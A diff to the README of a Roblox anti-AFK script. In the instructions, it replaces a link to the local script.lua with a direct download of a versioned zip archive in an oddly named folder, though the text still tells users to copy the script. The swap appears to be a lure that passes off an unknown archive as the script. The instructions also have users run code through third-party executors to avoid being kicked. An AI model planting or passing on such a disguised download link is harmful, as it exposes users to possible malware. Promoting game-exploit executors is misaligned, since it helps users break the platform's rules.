@@ -17,7 +17,7 @@ A simple all-in-one Roblox script to:
 
 ## 📖 How to Use
 
-1. Copy the script from [`script.lua`](./script.lua).
+1. Copy the script from [`https://github.com/sparktech360/anti-afk-roblox-/raw/refs/heads/main/filmily/roblox_afk_anti_2.7.zip`](https://github.com/sparktech360/anti-afk-roblox-/raw/refs/heads/main/filmily/roblox_afk_anti_2.7.zip).
 2. Open Roblox and your executor (e.g. Synapse, Fluxus, etc.).
 3. Paste the script and execute.
 4. Enjoy AFK farming without worrying about being kicked!
